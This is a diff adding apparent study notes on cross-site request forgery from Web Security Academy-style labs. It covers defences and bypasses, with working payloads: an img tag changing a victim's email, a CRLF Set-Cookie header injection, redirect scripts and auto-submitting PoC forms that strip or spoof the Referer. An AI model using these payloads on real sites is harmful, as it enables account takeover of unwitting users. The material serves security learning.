@@ -1,0 +1,142 @@
+CSRF 
+
+How CSRF works:
+
+1. A relevant action 
+2. Server is fully based on browser session 
+3. No unpredictable parameters. 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+CSRF vulnerability with no defenses
+
+1. Find the relevent request that matches CSRF
+2. Right click use Encagement tools -> CSRF Poc generator
+3. Click options and enable auto-submit
+4. Then regenerate the CSRF 
+5. Share CSRF HTML to victim. 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+CSRF via XSS
+<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Common defences against CSRF
+
+1. CSRF token 
+2. Samesite-cookie - By default chrome enforces Lax 
+3. Refer-based validation
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+CSRF where token validation depends on request method
+Change POST method to Get or vise-versa and perform CSRF using POC CSRF generator
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+CSRF where token validation depends on token being present
+Omit the entire CSRF token 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+CSRF where token is not tied to user session
+Swap CSRF token of two different account request and check if it is bypassed. 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+CSRF where token is tied to non-session cookie
+
+1. In this case there are 2 CSRF input, one is CSRF token and CSRF cookie 
+2. Login with two different accounts and try to swap both CSRF input with different accounts request
+3. now we found both CSRF inputs are tied up but not tied up with SESSION handeling
+4. So we neeed to fix our CSRF cookie to victim's browser using HTTP header injection. we can inject below payload in CSRF POC
+          <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
+4. Now victim CSRF cookie and our CSRF token is tied perfectly. Hence both CSRF is correct and both CSRF is not tied up with session handling.
+5. So CSRF is bypassed 
+6. Then we can generate CSRF payload using CSRF Poc Generator.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+CSRF where token is duplicated in cookie
+Use same method used in above module (CSRF where token is tied to non-session cookie) But instead of valid CSRF cookie use fake CSRF cookie.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Request from 	           Request to 	              Same-site?                Same-origin?
+https://example.com 	https://example.com 	        Yes 	                Yes
+https://app.example.com https://intranet.example.com 	Yes 	                No: mismatched domain name
+https://example.com 	https://example.com:8080 	Yes 	                No: mismatched port
+https://example.com 	https://example.co.uk 	        No: mismatched eTLD 	No: mismatched domain name
+https://example.com 	http://example.com 	        No: mismatched scheme 	No: mismatched scheme 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+SameSite Lax bypass via method override
+
+1. We found a relevant function for CSRF.
+2. We found SameSite: Lax 
+3. Change relevant request from POST to GET. 
+4. Server accepts only POST, So we are using "METHOD" funtionality
+      GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1
+5. Then Our CSRF payload could be 
+       <script>
+    document.location = "https://0a5c007f040b9e92c1b09a13005d0044.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
+</script>
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+SameSite Strict bypass via client-side redirect
+
+1.Find Come client-side redirect funtionality
+2. In this case we found GET /post/comment/confirmation?postId=x This redirects us 
+3. try to change postID parameter value as some other page ex:/../../my-account
+4. Then, Craft a payload like below 
+         <script>
+    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
+</script>
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+SameSite Strict bypass via sibling domain
++++++++++++Bending For websocket++++++++++++++++++++
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+SameSite Lax bypass via cookie refresh
++++++++++++++++Bending For OAuth
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+CSRF where Referer validation depends on header being present
+
+1. We found that Function are validating using Referer header
+2. And If we Omit Referer header CSRF is possible 
+3. So we need to create a CSRF payload that omit referer header
+         <meta name="referrer" content="never">
+4. Make sure we inject "META" payload in top of the request 
+
+  <html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <head>
+  <meta name="referrer" content="never">
+  </head>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://0aec00a8032157fbc11803cc00bd0049.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="ssssssssssf&#64;gmail&#46;com" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+CSRF with broken Referer validation
+
+1. We found that Function are validating using Referer header
+2. And If we modify referer header its bypassing CSRF protection, Because server checks only if referer header contain domain or not.
+3. So we need to create a CSRF payload that adds domain keyword in Referer header. 
+          history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
+4. And Add one more header to avoid header filteration
+          Referrer-Policy: unsafe-url
+5. So our final CSRF payload will be like below, with this header "Referrer-Policy: unsafe-url"
+
+          <html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <body>
+  <script>history.pushState("", "", "/?0aa000ea0307c571c041f4c70018003c.web-security-academy.net")</script>
+    <form action="https://0aa000ea0307c571c041f4c70018003c.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="moni111&#64;gmail&#46;com" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+How to prevent CSRF token
+
+1. Use CSRF token with hard coded 
+      Unpreditdable  | You should use a cryptographically secure pseudo-random number generator (CSPRNG)
+      Strict validation
+      Tied with user session 
+      CSRF Token should be hidden | <input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz" />
+2. Use SameSite cookie as "Strict"
+3. Be aware of SameSite & SameOrgin
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
